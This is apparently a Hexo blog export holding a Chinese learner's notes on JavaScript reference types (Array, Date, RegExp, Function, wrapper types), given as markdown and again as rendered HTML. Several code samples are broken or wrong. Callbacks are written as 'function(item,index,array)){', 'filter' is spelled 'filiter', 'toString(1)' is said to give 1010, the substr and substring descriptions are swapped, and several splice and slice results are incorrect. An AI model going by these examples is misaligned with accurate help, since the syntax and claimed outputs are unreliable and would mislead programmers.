—接受两个参数，第一个是寻找字符，第二个是指定位置，默认从0开始往后\nlastIndexOf —接受两个参数，第一个是寻找字符，第二个是指定位置，默认从后开始往前\n4、trim\n将字符串前后空格去除\n5、大小写转换方法\ntoLowerCase //转换为小写\ntoUpperCase //转换为大写\ntoLocaleLowerCase\ntoLocaleUpperCase\n6、replace\n采用两个参数，第一个是匹配的正则表达式，第二个是替换内容\n7、localeCompare方法\n比较两个字符串，返回1,0，-1\n8、fromCharCode方法\n接受多个参数，将ASCII码转换成对应的字符\n##### 单体内置对象\n1、Global对象\nURI编码方法\n(1)encodeURI，将空格转换成%20\n(2)encodeURIComponent,将所有非字符转换成对应编码\n(3)decodeURI，将encodeURI转换的uri反编码\n(4)decodeURIComponent，将encodeURIComponent转换的uri反编码\n2、eval方法\n只接受一个参数，将字符串解析成JavaScript代码\n```\neval('console.log(123)')  // 123\n\n```\n#### 小结\n通过本章学习，有许多细致的方法以前没有使用过的现在很多都理解了。还有数组的存储，以前只是一个黑匣子对于我而言。现在能够认清它的本质，能对以后的代码优化有更好的帮助。","source":"_posts/read-javascript-again-chapter5.md","raw":"---\ntitle: JavaScript高级程序设计重读---5章\ndate: 2017-07-12 12:01:33\ntags: javascript\ndir: javascript\nkeywords: JavaScript高级程序设计\n---\n### 引用类型\n#### Object类型\n1、JavaScript会将对象的属性自动转换成字符串\n```\nvar person = {\n    \"name\":'gdccwxx',\n    \"age\": 29,\n    5:true\n}\n全等于\nvar person = {\n    \"name\":'gdccwxx',\n    \"age\": 29,\n    \"5\": true\n}\n```\n_ps:最后一个属性后面是不添加逗号的，如果添加，在IE7即更早之前版本和Opera出现错误_\n\n2、两种访问对象的方法。\n\n(1)在对象后面使用.来访问对象的属性\n(2)使用['']来访问对象的属性\n```\nvar person = {\n    \"name\":'gdccwxx',\n    \"age\": 29\n}\nperson.name         // gdccwxx\nperson['name']      // gdccwxx\n```\n第二种方法有好处，在对象的属性有空格的时候，只能用第二种\n#### Array类型\n数组是一组按序排列的值，相对地，对象的属性名称是无序的。从本质上讲，数组是按次序排列的一组值，数组是一种特殊的对象。\n```\nvar arr = ['a', 'b', 'c'];\nObject.keys(arr);// [\"0\", \"1\", \"2\"]\n```\nJavaScript的数据类型分为：值类型和引用类型(地址值)；而常见的引用类型有Object和Array／数组的存储模型中，如果是诸如Number,String之类的类型数据会被直接压入栈中，而引用类型只会压入对该值的一个索引（即C中所说的保存了数据的指针）。这些数据时储存在堆中的某块区间中，堆栈并不是独立的，栈中也可以在堆中存放。\n##### 数组的创建\nvar arrayObj = new Array();　//创建一个数组\nvar arrayObj = new Array(size);　//创建一个数组并指定长度，注意不是上限，是长度\nvar arrayObj = new Array([element0[, element1[, ...[, elementN]]]]);　//创建一个数组并赋值\nvar arrayObj = []\n##### 数组的检测\nvalue instanceof Array  // true or false\nArray.isArray(value)    // true or false\n##### 转换方法\n调用Array.prototype.toString()方法，将Array转换成字符串\n##### 数组的几种操作方法\n\n| 方法 | 解释 |\n|---|---|\n|shift |获取数组的第一项并返回，减少数组的length值|\n|unshift |在数组前端添加任意个项并返回新数组的长度|\n|pop |从数组某位移除最后一项，减少数组的length值|\n|push |接受任意个参数，把他们逐个添加到数组末尾，病返回修改后数组的长度|\n|reverse |不接受参数，将数组项的顺序翻转|\n|sort |调用每个数组项的toString()转型方法，然后比较的到字符串，已确定如何重排，其返回值和reverse都是排序后的数组|\n|concat |创建一个数组副本，将参数添加到副本之后。接受一个或多个参数，返回连接后的数组|\n|slice |接受一个或两个参数，即要返回项的起始位置和结束位置，只有一个参数返回从指定位置到末尾项所有元项|\n|splice |(1)删除：指定两个参数，要删除的第一项的位置和要删除的项数(2)插入：指定三个参数，起始位置，0(要删除的项数)和要插入的个项。如果要插入多项，则传入多个参数(3)替换：指定三个参数：起始位置、要删除的项数和要插入的任一项。插入和删除的项数不必相等|\n|indexOf |从数组的开头位置(0)开始向后查找，没找到返回-1|\n|lastIndexOf |从数组的最后位置(length-1)开始向前查找，没找到返回-1|\n|every |对数组的每一项都运行给定函数，如果该数组的每一项都返回true，则返回true|\n|filiter |对数组的每一项运行给定函数，返回该函数会返回true的项组成的数组|\n|forEach |对数组的每一项运行给定的函数，这个方法没有返回值|\n|map |对数组的每一项运行给定函数，返回每次函数调用的结果组成的数组|\n|some |对数组中的每一项运行给定函数，任意一项返回true，则返回true|\n|reduce |从数组的第一项开始，逐个遍历到最后|\n|reduceRight |从数组的最后一项开始，逐个遍历到第一个|\n\n```\nvar color = ['red','green']\n// shift\nvar item1 = color.shift()\nitem1       // 'red'   color = ['green']   color.length = 1\n// unshift\nvar item2 = color.unshift('red','blue')\nitem2       // 3    color = ['red','blue','green']\n// pop \nvar item3 = color.pop()\nitem3       // green    color=['red','blue'] color.length = 2\n// push\nvar item4 = color.push('gray')\nitem4       // 3    color = ['red','blue','gray']   color.length = 3\n// reverse\ncolor.reverse() //color = ['gray','blue','red']\n// sort\nfunction compare(value1,value2){\n    if(value1 < value2){\n        return 1;\n    }else if(value1 > value2){\n        return -1\n    }else {\n        return 0\n    }\n}\ncolor.sort(compare)     //[\"red\", \"gray\", \"blue\"]\n// concat\nvar color2 = color.concat('red')\ncolor2      //[\"red\", \"gray\", \"blue\", \"red\"]\n// slice\nvar removed1 = color.slice(1)\nvar removed2 = color.slice(1,3)\nremoved1    // \"gray,blue,red\"\nremoved2    // \"gray,blue\"\n// splice\nvar removed3 = color.splice(0,1)    // 删除第一项\nremoved3    // 'red'\nvar removed4 = color.splice(1,0,'origin','pink')    // 从位置1插入两项\nremoved4    // 'red,origin,pink,gray,blue,red'\nvar removed5 = color.splice(1,1,'purple')           // 插入一项，删除一项\nremoved5    // 'red,purple,blue,red'\n// indexOf\nvar item10 = color.indexOf('blue')\nitem10      // 2\n// lastIndexOf\nvar item11 = color.indexOf('red')\nitem11      // 3\n// every\nvar item12 = color.every(function(item, index, array)){     //参数为item，迭代到的元素\n    return item == 'red'            // index,索引，array，数组本身\n}\nitem12      // false\n// filiter \nvar item13 = color.filiter(function(item,index,array)){\n    return (item == 'red')\n}\nitem13      // red,red\n// forEach \ncolor.forEach(function(item,index,array)){\n    //执行某些操作\n}\n// map\nvar item15 = color.map(function(item,index,array)){\n    return ('color is ' +item)\n}\nitem15      // [\"color is red\", \"color is gray\", \"color is blue\", \"color is red\"]\n// some\nvar item16 = color.some(function(item, index, array)){     //参数为item，迭代到的元素\n    return item == 'red'            // index,索引，array，数组本身\n}\nitem16      // true\n// reduce()\nvar item17 = color.reduce(function(prev,cur,index,array)){\n    return (prev + ' + ' cur)\n}\nitem17      // \"red + gray + blue + red\"\nvar item18 = color.reduceRight(function(prev,cur,index,array)){\n    return (prev + ' + ' cur)\n}\nitem18      // \"red + blue + gray + red\"\n\n```\n#### Date类型\n从国际时间1970年1月1日零时开始，可以精确到之后的100 000 000年\n##### toString,toLocaleString\n```\nvar date = new Date()\ndate\nWed Jul 12 2017 15:39:22 GMT+0800 (CST)\ndate.toLocaleString()\n\"7/12/2017, 3:39:22 PM\"\ndate.toString()\n\"Wed Jul 12 2017 15:39:22 GMT+0800 (CST)\"\n\n```\n如果是toString()，会直接返回标准的格式；\n如果是toLocaleString()，先判断是否指定语言环境（locale），指定的话则返回当前语言环境下的格式设置（options）的格式化字符串；没有指定语言环境（locale），则返回一个使用默认语言环境和格式设置（options）的格式化字符串。\n##### 日期格式的方法\n| 方法 | 解释 |\n|---|---|\n|toDateString |特定显示的格式显示星期几，月，日，年|\n|toTimeString |显示时，分，秒|\n|toLocalDateString |显示地区的星期几，月，日，年|\n|toLocalTimeString |显示地区的时，分，秒|\n|toUTCString |显示完整格式的UTC日期|\n|toLocaleString |区别如上|\n|toString |区别如上|\n\n```\nvar date = new Date()\ndate.toDateString()\n\"Wed Jul 12 2017\"\ndate.toTimeString()\n\"15:49:48 GMT+0800 (CST)\"\ndate.toLocaleDateString()\n\"7/12/2017\"\ndate.toLocaleTimeString()\n\"3:49:48 PM\"\ndate.toUTCString()\n\"Wed, 12 Jul 2017 07:49:48 GMT\"\n\n```\n\n#### RegExp类型\n##### 实例属性\n\n| 方法 | 解释 |\n|---|---|\n|global |布尔值，表示是否设置了g|\n|ignoreCase |布尔值，表示是否设置了i|\n|lastIndex |整数，表示开始搜索下一个匹配的字符标志，从0算起|\n|multiline |布尔值，表示是否设置了m标志|\n|sorce |正则表达式的字符串表示|\n##### 实例方法\nexec —接受一个参数，即要应用模式的字符串，然后返回包含一个匹配信息的数组，或者没有匹配返回null\ntest —接受一个字符串参数，在该模式下匹配成功返回true，否则返回false(只要存在即返回true)\n```\nvar text = 'cat, bat, sat, fat'\nvar pattern = /.at/;\nvar matches = pattern.exec(text)    \nmatches[0]      //cat\nmatches.index   // 0\nvar text = \"456000-00-000123\"\nvar pattern = /\\d{3}-\\d{2}-\\d{2}/\npattern.test(text)      // true\n\n```\n#### Function类型\n每个函数都是Function类型的实例，而且都有与其他引用类型一样具有属性和方法。由于函数是对象，因此函数名实际上也是一个指向函数的指针，不会与某个函数绑定。\n既然函数名是一个指针，所以JavaScript没有重载。\n**ps：访问函数指针时，应该不加圆括号**\n##### 函数表达式和函数声明\n由于JavaScript中有函数声明解析器，在所有函数执行前，会将函数声明提升至顶端。因此，函数表达式和函数声明会有一些区别\n```\nsum1(10,11)     //21\nfunction sum1(num1,num2){\n    return num1+num2\n}\nsum2(10,12) //Uncaught TypeError: sum2 is not a function\nvar sum2 = function (num1,num2){\n    return num1+num2\n}\n```\n其他无明显差别\n##### callee caller\ncallee被调用者\ncaller调用者\nmdn不建议使用\n##### 函数的属性和方法\n```\nfunction F1(a,b){\n    //\n}\nfunction F2(){\n    //\n}\nF1.length // 2\nF2.length // 0\n```\n函数的length属性代表参数的个数\n##### call与apply\n```\nfunction sum(num1,num2){\n    return num1+num2\n}\nfunction callSum(num1, num2){\n    return sum.call(this,num1,num2)\n}\ncallSum(10,10)  //20\nfunction sum(num1,num2){\n    return num1+num2\n}\nfunction callSum(num1, num2){\n    return sum.call(this,arguments)\n}\ncallSum(10,10)  //20\n```\ncall和apply是两个非继承而来的方法，apply接受两个参数，一个是运行时函数的作用域，另一个是arguments对象或array实例；而call方法第一个参数是运行时函数作用域，其他参数是传入字面量。必须逐个列举出来\n```\nwindow.color = 'red'\nvar o = {\n    color:'green'\n}\nfunction sayCOlor(){\n    console.log(this.color)\n}\nsayCOlor.call(this)     //red\nsayCOlor.call(window)   //red\nsayCOlor.call(o)        //green\n```\ncall,apply的最大好处是让其扩充作用域，且实现松耦合\n\nbind是创建一个实例，其this值会被绑定到传给bind函数的值\n```\nwindow.color = 'red'\nvar o = {\n    color : 'blue'\n}\nfunction sayColor(){\n    console.log(this.color)\n}\nvar objectSayColor = sayColor.bind(o)\nobjectSayColor()    //blue\n```\n\n#### 基本包装类型\n##### Boolean类型\n```\nvar falseObject = new Boolean(false)\nvar result = falseObject  && true\nresult // true\nvar falseValue = false\nresult = falseValue && true\nresult // false\ntypeof falseObject  // object\ntypeof falseValue   // boolean\nfalseObject instanceof Boolean  //true\nfalseValue instanceof Boolean   //false\n\n```\n基本类型布尔值与Boolean对象有一定差别，书上建议永远不要使用Boolean对象\n##### Number类型\n```\nvar numberObject = new Number(10)\nnumberObject    // Number {[[PrimitiveValue]]: 10}\nnumberObject.toString() // \"10\"\nnumberObject.valueOf()  // 10\n```\nNumber类型重写了valueOf(),toLocaleString(),toString()，重写后，valueOf返回基本类型值\n基本类型的几个方法\n\n1、toFixed // 有一个参数，代表保留几位小数\n2、toExponential // 指数表示法，表示制定输出结果中小数位数\n3、toPrecision // 接受一个参数，合理的调用toFixed和toExponential\n4、toString // 接受一个参数，代表转换成几进制\n```\nvar num = 10\nnum.toString()  //10\nnum.toString(1)  //1010\nnum.toFixed(2)  //10.00\nnum.toExponential(1)  //1.0e+1\nvar nums = 99\nnum.toPrecision(1)  //1e+2\nnum.toPrecision(2)  // 99\nnum.toPrecision(3)  // 99.0\n\n```\n##### String类型\n1、字符方法\ncharAt —以单个字符串的形式返回给定位置的字符\ncharCodeAt —以单个字符串的形式返回给定位置的字符编码\n```\nvar stringValue = 'hello world'\nstringValue.charAt(1)       // e\nstringValue.charCodeAt(1)   // 101\n```\n2、字符串方法\nslice —接受两个参数，第一个是指定位置，第二个位结束位置，为负数从后往前切取\nsubstr —接受两个参数，第一个是指定位置，第二个是结束位置，为负数从0往后开始\nsubstring —接受两个参数，第一个是指定位置，第二个是字符个数，为负数从后往前切取\n3、字符串位置\nindexOf —接受两个参数，第一个是寻找字符，第二个是指定位置，默认从0开始往后\nlastIndexOf —接受两个参数，第一个是寻找字符，第二个是指定位置，默认从后开始往前\n4、trim\n将字符串前后空格去除\n5、大小写转换方法\ntoLowerCase //转换为小写\ntoUpperCase //转换为大写\ntoLocaleLowerCase\ntoLocaleUpperCase\n6、replace\n采用两个参数，第一个是匹配的正则表达式，第二个是替换内容\n7、localeCompare方法\n比较两个字符串，返回1,0，-1\n8、fromCharCode方法\n接受多个参数，将ASCII码转换成对应的字符\n##### 单体内置对象\n1、Global对象\nURI编码方法\n(1)encodeURI，将空格转换成%20\n(2)encodeURIComponent,将所有非字符转换成对应编码\n(3)decodeURI，将encodeURI转换的uri反编码\n(4)decodeURIComponent，将encodeURIComponent转换的uri反编码\n2、eval方法\n只接受一个参数，将字符串解析成JavaScript代码\n```\neval('console.log(123)')  // 123\n\n```\n#### 小结\n通过本章学习，有许多细致的方法以前没有使用过的现在很多都理解了。还有数组的存储，以前只是一个黑匣子对于我而言。现在能够认清它的本质，能对以后的代码优化有更好的帮助。","slug":"read-javascript-again-chapter5","published":1,"updated":"2021-10-13T15:50:12.540Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz0700134jzx3qkfrdbr","content":"<h3 id=\"引用类型\"><a href=\"#引用类型\" class=\"headerlink\" title=\"引用类型\"></a>引用类型</h3><h4 id=\"Object类型\"><a href=\"#Object类型\" class=\"headerlink\" title=\"Object类型\"></a>Object类型</h4><p>1、JavaScript会将对象的属性自动转换成字符串<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var person = &#123;</span><br><span class=\"line\">    &quot;name&quot;:&apos;gdccwxx&apos;,</span><br><span class=\"line\">    &quot;age&quot;: 29,</span><br><span class=\"line\">    5:true</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">全等于</span><br><span class=\"line\">var person = &#123;</span><br><span class=\"line\">    &quot;name&quot;:&apos;gdccwxx&apos;,</span><br><span class=\"line\">    &quot;age&quot;: 29,</span><br><span class=\"line\">    &quot;5&quot;: true</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p><em>ps:最后一个属性后面是不添加逗号的，如果添加，在IE7即更早之前版本和Opera出现错误</em></p><p>2、两种访问对象的方法。</p><p>(1)在对象后面使用.来访问对象的属性<br>(2)使用[‘’]来访问对象的属性<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var person = &#123;</span><br><span class=\"line\">    &quot;name&quot;:&apos;gdccwxx&apos;,</span><br><span class=\"line\">    &quot;age&quot;: 29</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">person.name         // gdccwxx</span><br><span class=\"line\">person[&apos;name&apos;]      // gdccwxx</span><br></pre></td></tr></table></figure><p></p><p>第二种方法有好处，在对象的属性有空格的时候，只能用第二种</p><h4 id=\"Array类型\"><a href=\"#Array类型\" class=\"headerlink\" title=\"Array类型\"></a>Array类型</h4><p>数组是一组按序排列的值，相对地，对象的属性名称是无序的。从本质上讲，数组是按次序排列的一组值，数组是一种特殊的对象。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var arr = [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;];</span><br><span class=\"line\">Object.keys(arr);// [&quot;0&quot;, &quot;1&quot;, &quot;2&quot;]</span><br></pre></td></tr></table></figure><p></p><p>JavaScript的数据类型分为：值类型和引用类型(地址值)；而常见的引用类型有Object和Array／数组的存储模型中，如果是诸如Number,String之类的类型数据会被直接压入栈中，而引用类型只会压入对该值的一个索引（即C中所说的保存了数据的指针）。这些数据时储存在堆中的某块区间中，堆栈并不是独立的，栈中也可以在堆中存放。</p><h5 id=\"数组的创建\"><a href=\"#数组的创建\" class=\"headerlink\" title=\"数组的创建\"></a>数组的创建</h5><p>var arrayObj = new Array();　//创建一个数组<br>var arrayObj = new Array(size);　//创建一个数组并指定长度，注意不是上限，是长度<br>var arrayObj = new Array([element0[, element1[, …[, elementN]]]]);　//创建一个数组并赋值<br>var arrayObj = []</p><h5 id=\"数组的检测\"><a href=\"#数组的检测\" class=\"headerlink\" title=\"数组的检测\"></a>数组的检测</h5><p>value instanceof Array // true or false<br>Array.isArray(value) // true or false</p><h5 id=\"转换方法\"><a href=\"#转换方法\" class=\"headerlink\" title=\"转换方法\"></a>转换方法</h5><p>调用Array.prototype.toString()方法，将Array转换成字符串</p><h5 id=\"数组的几种操作方法\"><a href=\"#数组的几种操作方法\" class=\"headerlink\" title=\"数组的几种操作方法\"></a>数组的几种操作方法</h5><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>shift</td><td>获取数组的第一项并返回，减少数组的length值</td></tr><tr><td>unshift</td><td>在数组前端添加任意个项并返回新数组的长度</td></tr><tr><td>pop</td><td>从数组某位移除最后一项，减少数组的length值</td></tr><tr><td>push</td><td>接受任意个参数，把他们逐个添加到数组末尾，病返回修改后数组的长度</td></tr><tr><td>reverse</td><td>不接受参数，将数组项的顺序翻转</td></tr><tr><td>sort</td><td>调用每个数组项的toString()转型方法，然后比较的到字符串，已确定如何重排，其返回值和reverse都是排序后的数组</td></tr><tr><td>concat</td><td>创建一个数组副本，将参数添加到副本之后。接受一个或多个参数，返回连接后的数组</td></tr><tr><td>slice</td><td>接受一个或两个参数，即要返回项的起始位置和结束位置，只有一个参数返回从指定位置到末尾项所有元项</td></tr><tr><td>splice</td><td>(1)删除：指定两个参数，要删除的第一项的位置和要删除的项数(2)插入：指定三个参数，起始位置，0(要删除的项数)和要插入的个项。如果要插入多项，则传入多个参数(3)替换：指定三个参数：起始位置、要删除的项数和要插入的任一项。插入和删除的项数不必相等</td></tr><tr><td>indexOf</td><td>从数组的开头位置(0)开始向后查找，没找到返回-1</td></tr><tr><td>lastIndexOf</td><td>从数组的最后位置(length-1)开始向前查找，没找到返回-1</td></tr><tr><td>every</td><td>对数组的每一项都运行给定函数，如果该数组的每一项都返回true，则返回true</td></tr><tr><td>filiter</td><td>对数组的每一项运行给定函数，返回该函数会返回true的项组成的数组</td></tr><tr><td>forEach</td><td>对数组的每一项运行给定的函数，这个方法没有返回值</td></tr><tr><td>map</td><td>对数组的每一项运行给定函数，返回每次函数调用的结果组成的数组</td></tr><tr><td>some</td><td>对数组中的每一项运行给定函数，任意一项返回true，则返回true</td></tr><tr><td>reduce</td><td>从数组的第一项开始，逐个遍历到最后</td></tr><tr><td>reduceRight</td><td>从数组的最后一项开始，逐个遍历到第一个</td></tr></tbody></table><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var color = [&apos;red&apos;,&apos;green&apos;]</span><br><span class=\"line\">// shift</span><br><span class=\"line\">var item1 = color.shift()</span><br><span class=\"line\">item1       // &apos;red&apos;   color = [&apos;green&apos;]   color.length = 1</span><br><span class=\"line\">// unshift</span><br><span class=\"line\">var item2 = color.unshift(&apos;red&apos;,&apos;blue&apos;)</span><br><span class=\"line\">item2       // 3    color = [&apos;red&apos;,&apos;blue&apos;,&apos;green&apos;]</span><br><span class=\"line\">// pop </span><br><span class=\"line\">var item3 = color.pop()</span><br><span class=\"line\">item3       // green    color=[&apos;red&apos;,&apos;blue&apos;] color.length = 2</span><br><span class=\"line\">// push</span><br><span class=\"line\">var item4 = color.push(&apos;gray&apos;)</span><br><span class=\"line\">item4       // 3    color = [&apos;red&apos;,&apos;blue&apos;,&apos;gray&apos;]   color.length = 3</span><br><span class=\"line\">// reverse</span><br><span class=\"line\">color.reverse() //color = [&apos;gray&apos;,&apos;blue&apos;,&apos;red&apos;]</span><br><span class=\"line\">// sort</span><br><span class=\"line\">function compare(value1,value2)&#123;</span><br><span class=\"line\">    if(value1 &lt; value2)&#123;</span><br><span class=\"line\">        return 1;</span><br><span class=\"line\">    &#125;else if(value1 &gt; value2)&#123;</span><br><span class=\"line\">        return -1</span><br><span class=\"line\">    &#125;else &#123;</span><br><span class=\"line\">        return 0</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">color.sort(compare)     //[&quot;red&quot;, &quot;gray&quot;, &quot;blue&quot;]</span><br><span class=\"line\">// concat</span><br><span class=\"line\">var color2 = color.concat(&apos;red&apos;)</span><br><span class=\"line\">color2      //[&quot;red&quot;, &quot;gray&quot;, &quot;blue&quot;, &quot;red&quot;]</span><br><span class=\"line\">// slice</span><br><span class=\"line\">var removed1 = color.slice(1)</span><br><span class=\"line\">var removed2 = color.slice(1,3)</span><br><span class=\"line\">removed1    // &quot;gray,blue,red&quot;</span><br><span class=\"line\">removed2    // &quot;gray,blue&quot;</span><br><span class=\"line\">// splice</span><br><span class=\"line\">var removed3 = color.splice(0,1)    // 删除第一项</span><br><span class=\"line\">removed3    // &apos;red&apos;</span><br><span class=\"line\">var removed4 = color.splice(1,0,&apos;origin&apos;,&apos;pink&apos;)    // 从位置1插入两项</span><br><span class=\"line\">removed4    // &apos;red,origin,pink,gray,blue,red&apos;</span><br><span class=\"line\">var removed5 = color.splice(1,1,&apos;purple&apos;)           // 插入一项，删除一项</span><br><span class=\"line\">removed5    // &apos;red,purple,blue,red&apos;</span><br><span class=\"line\">// indexOf</span><br><span class=\"line\">var item10 = color.indexOf(&apos;blue&apos;)</span><br><span class=\"line\">item10      // 2</span><br><span class=\"line\">// lastIndexOf</span><br><span class=\"line\">var item11 = color.indexOf(&apos;red&apos;)</span><br><span class=\"line\">item11      // 3</span><br><span class=\"line\">// every</span><br><span class=\"line\">var item12 = color.every(function(item, index, array))&#123;     //参数为item，迭代到的元素</span><br><span class=\"line\">    return item == &apos;red&apos;            // index,索引，array，数组本身</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">item12      // false</span><br><span class=\"line\">// filiter </span><br><span class=\"line\">var item13 = color.filiter(function(item,index,array))&#123;</span><br><span class=\"line\">    return (item == &apos;red&apos;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">item13      // red,red</span><br><span class=\"line\">// forEach </span><br><span class=\"line\">color.forEach(function(item,index,array))&#123;</span><br><span class=\"line\">    //执行某些操作</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// map</span><br><span class=\"line\">var item15 = color.map(function(item,index,array))&#123;</span><br><span class=\"line\">    return (&apos;color is &apos; +item)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">item15      // [&quot;color is red&quot;, &quot;color is gray&quot;, &quot;color is blue&quot;, &quot;color is red&quot;]</span><br><span class=\"line\">// some</span><br><span class=\"line\">var item16 = color.some(function(item, index, array))&#123;     //参数为item，迭代到的元素</span><br><span class=\"line\">    return item == &apos;red&apos;            // index,索引，array，数组本身</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">item16      // true</span><br><span class=\"line\">// reduce()</span><br><span class=\"line\">var item17 = color.reduce(function(prev,cur,index,array))&#123;</span><br><span class=\"line\">    return (prev + &apos; + &apos; cur)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">item17      // &quot;red + gray + blue + red&quot;</span><br><span class=\"line\">var item18 = color.reduceRight(function(prev,cur,index,array))&#123;</span><br><span class=\"line\">    return (prev + &apos; + &apos; cur)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">item18      // &quot;red + blue + gray + red&quot;</span><br></pre></td></tr></table></figure><h4 id=\"Date类型\"><a href=\"#Date类型\" class=\"headerlink\" title=\"Date类型\"></a>Date类型</h4><p>从国际时间1970年1月1日零时开始，可以精确到之后的100 000 000年</p><h5 id=\"toString-toLocaleString\"><a href=\"#toString-toLocaleString\" class=\"headerlink\" title=\"toString,toLocaleString\"></a>toString,toLocaleString</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var date = new Date()</span><br><span class=\"line\">date</span><br><span class=\"line\">Wed Jul 12 2017 15:39:22 GMT+0800 (CST)</span><br><span class=\"line\">date.toLocaleString()</span><br><span class=\"line\">&quot;7/12/2017, 3:39:22 PM&quot;</span><br><span class=\"line\">date.toString()</span><br><span class=\"line\">&quot;Wed Jul 12 2017 15:39:22 GMT+0800 (CST)&quot;</span><br></pre></td></tr></table></figure><p>如果是toString()，会直接返回标准的格式；<br>如果是toLocaleString()，先判断是否指定语言环境（locale），指定的话则返回当前语言环境下的格式设置（options）的格式化字符串；没有指定语言环境（locale），则返回一个使用默认语言环境和格式设置（options）的格式化字符串。</p><h5 id=\"日期格式的方法\"><a href=\"#日期格式的方法\" class=\"headerlink\" title=\"日期格式的方法\"></a>日期格式的方法</h5><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>toDateString</td><td>特定显示的格式显示星期几，月，日，年</td></tr><tr><td>toTimeString</td><td>显示时，分，秒</td></tr><tr><td>toLocalDateString</td><td>显示地区的星期几，月，日，年</td></tr><tr><td>toLocalTimeString</td><td>显示地区的时，分，秒</td></tr><tr><td>toUTCString</td><td>显示完整格式的UTC日期</td></tr><tr><td>toLocaleString</td><td>区别如上</td></tr><tr><td>toString</td><td>区别如上</td></tr></tbody></table><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var date = new Date()</span><br><span class=\"line\">date.toDateString()</span><br><span class=\"line\">&quot;Wed Jul 12 2017&quot;</span><br><span class=\"line\">date.toTimeString()</span><br><span class=\"line\">&quot;15:49:48 GMT+0800 (CST)&quot;</span><br><span class=\"line\">date.toLocaleDateString()</span><br><span class=\"line\">&quot;7/12/2017&quot;</span><br><span class=\"line\">date.toLocaleTimeString()</span><br><span class=\"line\">&quot;3:49:48 PM&quot;</span><br><span class=\"line\">date.toUTCString()</span><br><span class=\"line\">&quot;Wed, 12 Jul 2017 07:49:48 GMT&quot;</span><br></pre></td></tr></table></figure><h4 id=\"RegExp类型\"><a href=\"#RegExp类型\" 